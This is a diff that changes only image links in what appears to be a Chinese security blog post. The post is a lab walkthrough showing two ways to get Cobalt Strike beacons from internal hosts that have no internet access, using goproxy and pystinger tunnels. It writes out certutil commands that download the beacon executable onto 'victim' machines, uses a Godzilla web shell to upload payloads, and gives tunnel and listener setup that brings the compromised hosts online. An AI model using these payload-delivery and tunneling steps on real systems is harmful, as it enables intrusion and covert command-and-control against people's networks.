@@ -15,14 +15,14 @@ __
 收录于话题
 
   
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173320.png)**前言**  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173320.png)**前言**  
 
 #####
 某个时候，在实战过程中拿到shell后，突然发现目标机器ping不通外网，没有办法走网络层协议，这时候就需要搭建不出网隧道。在本篇文章中，斗哥要送你们两个Cobalt
 strike上线不出网主机的实用方法。
 
   
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173320.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173320.png)
 **小技巧1：**  
 
  **利用goproxy上线不出网主机到Cobaltstrike**
@@ -45,11 +45,11 @@ strike上线不出网主机的实用方法。
 
 ###### 网络拓扑：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173322.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173322.png)
 
 ###### FW2防火墙配置如下：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173323.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173323.png)
 
 ###### 保证10.10.18.51只能与10.10.19.100通信，不能与66.28.6.100通信。
 
@@ -62,12 +62,12 @@ strike上线不出网主机的实用方法。
     
     proxy.exe http -t tcp -p "0.0.0.0:4444" --daemon
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173324.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173324.png)
 
 ###### Cobalt strike创建监听器，有效荷载选择Windows
 Executable(S)，不然无法上线，然后利用Godzilla将该文件上传到web服务器供受害机2下载使用。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173326.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173326.png)
 
 ###### 受害机2执行如下命令，下载CS的有效载荷。
 
@@ -75,16 +75,16 @@ Executable(S)，不然无法上线，然后利用Godzilla将该文件上传到we
     
     certutil -urlcache -split -f http://10.10.19.100/goproxy_http.exe C:\Users\fujszzs\Desktop\goproxy_http.exe
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173327.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173327.png)
 
 ###### 受害机2执行马儿成功上线。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173328.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173328.png)
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173329.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173329.png)
 
   
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173320.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173320.png)
 **小技巧2：**  
 
 ####  **利用pystinger上线不出网主机到Cobaltstrike**
@@ -107,15 +107,15 @@ Executable(S)，不然无法上线，然后利用Godzilla将该文件上传到we
 
 ###### 网络拓扑：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173331.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173331.png)
 
 ###### FW2防护墙配置如下：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173332.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173332.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173333.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173333.png)
 
 ##### 0x02.单主机上线方式
 
@@ -123,7 +123,7 @@ Executable(S)，不然无法上线，然后利用Godzilla将该文件上传到we
 
 ###### 首先上传对应语言的脚本到服务器上，访问返回UTF-8表示正常。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173334.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173334.png)
 
 ###### 然后继续上传stinger_server.exe到目标服务器，并执行以下命令。
 
@@ -141,30 +141,30 @@ Executable(S)，不然无法上线，然后利用Godzilla将该文件上传到we
     
     ./stinger_client -w http://66.28.5.2/proxy.php -l 0.0.0.0 -p 60000
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173335.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173335.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173336.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173336.png)
 
 ###### Cobalt
 strike设置本地监听地址（127.0.0.1）和60020端口，然后选择cs_stinger的listen发送exe或者powershell都行。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173337.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173337.png)
 
 ###### webshell执行Cobalt strike生成的马儿，成功上线，并且vps这边可以看到有数据在交互。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173338.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173338.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173339.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173339.png)
 
 ##### 0x03.多主机上线方式
 
 ###### CobaltStrike->Listeners->Add->10.10.19.50:60020
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173342.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173342.png)
 
 ###### 受害机2执行如下命令，下载CS的有效载荷。
 
@@ -172,21 +172,21 @@ strike设置本地监听地址（127.0.0.1）和60020端口，然后选择cs_sti
     
     certutil -urlcache -split -f http://10.10.19.50/stingers.exe C:\Users\fujszzs\Desktop\stingers.exe
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173343.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173343.png)
 
 ###### 受害机1，受害机2执行马儿成功上线。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173344.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173344.png)
 
   
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173320.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173320.png)
 **总结：**  
 
 ######  本次列举了两个小技巧，希望能帮到大家。咱们下期见！
 
 ######  
 
-![]()![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173346.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173347.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173346.png)扫码关注我们更多精彩等待你发现
+![]()![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173346.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173347.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903173346.png)扫码关注我们更多精彩等待你发现
 
 预览时标签不可点
 
